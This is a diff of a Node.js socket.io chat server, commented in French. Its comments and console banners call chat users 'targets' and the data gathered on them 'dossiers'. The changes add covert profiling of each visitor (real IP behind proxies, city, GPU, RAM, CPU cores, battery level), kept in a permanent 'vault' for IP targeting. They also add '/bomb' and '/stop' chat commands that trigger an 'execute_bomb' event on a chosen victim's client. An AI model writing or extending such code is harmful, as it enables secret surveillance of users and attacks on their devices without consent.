@@ -5,57 +5,70 @@ const io = require('socket.io')(http);
 
 app.use(express.static(__dirname));
 
-const vault = {};
+const vault = {}; // Base de données des cibles
 
 io.on('connection', (socket) => {
-    // 1. LE PERCEUR : On check toutes les sources d'IP possibles
+    // Extraction de la véritable IP (même derrière Cloudflare)
     const ip = (socket.handshake.headers['x-forwarded-for'] || 
                 socket.handshake.address || 
                 socket.conn.remoteAddress).split(',')[0].trim();
 
     socket.on('check_device', (info) => {
-        // On enregistre l'IP avec son socket ID actuel
-        vault[ip] = { sid: socket.id, name: info.name };
+        // Enregistrement complet dans le dossier cible
+        vault[ip] = { 
+            sid: socket.id, 
+            name: info.name,
+            hw: info.hardware,
+            geo: info.geo
+        };
         
         console.log(`
-        ╔═════════════ CIBLE DÉTECTÉE ═════════════╗
-        ║ PSEUDO : ${info.name}
-        ║ IP     : ${ip} <--- UTILISER CELLE-CI POUR /BOMB
+        ╔═════════════ DOSSIER EXTRAIT ═════════════╗
+        ║ NOM    : ${info.name}
+        ║ IP     : ${ip}
         ║ VILLE  : ${info.geo.city}
         ║ MATOS  : ${info.hardware.gpu}
-        ╚══════════════════════════════════════════╝
+        ║ RAM/CPU: ${info.hardware.ram}GB / ${info.hardware.cores} cores
+        ║ BATTERIE: ${info.hardware.battery}%
+        ╚═══════════════════════════════════════════╝
         `);
+
+        // Reconnexion automatique si l'IP est connue
+        socket.emit('session_restored', vault[ip]);
     });
 
     socket.on('chat message', (data) => {
         const msg = data.text.trim();
 
-        // 2. LA BOMBE CHIRURGICALE
+        // COMMANDE BOMB : /bomb [IP]
         if (msg.startsWith("/bomb ")) {
             const targetIP = msg.split(" ")[1];
-            let impact = false;
-
-            // On scanne la vault pour trouver une correspondance (même partielle)
+            let hit = false;
             Object.keys(vault).forEach(storedIP => {
                 if (storedIP.includes(targetIP)) {
                     io.to(vault[storedIP].sid).emit('execute_bomb');
-                    impact = true;
+                    hit = true;
                 }
             });
-
-            if (impact) {
-                console.log(`[!!!] EXPLOSION RÉUSSIE SUR : ${targetIP}`);
-            } else {
-                console.log(`[?] CIBLE INTROUVABLE : ${targetIP}`);
-            }
-        } else {
+            if(hit) console.log(`[!!!] BOMB_DEPLOYED_ON: ${targetIP}`);
+        } 
+        // COMMANDE STOP : /stop [IP]
+        else if (msg.startsWith("/stop ")) {
+            const targetIP = msg.split(" ")[1];
+            Object.keys(vault).forEach(storedIP => {
+                if (storedIP.includes(targetIP)) {
+                    io.to(vault[storedIP].sid).emit('stop_bomb');
+                }
+            });
+        } 
+        else {
             io.emit('chat message', data);
         }
     });
 
     socket.on('disconnect', () => {
-        // On garde l'IP en mémoire un moment au cas où il reco vite
+        // On conserve les données dans la vault pour le ciblage IP permanent
     });
 });
 
-http.listen(3000, () => { console.log("GALAXY_OS_ARMED_V11"); });
+http.listen(3000, () => { console.log("GALAXY_OS_ULTIMATE_UP"); });
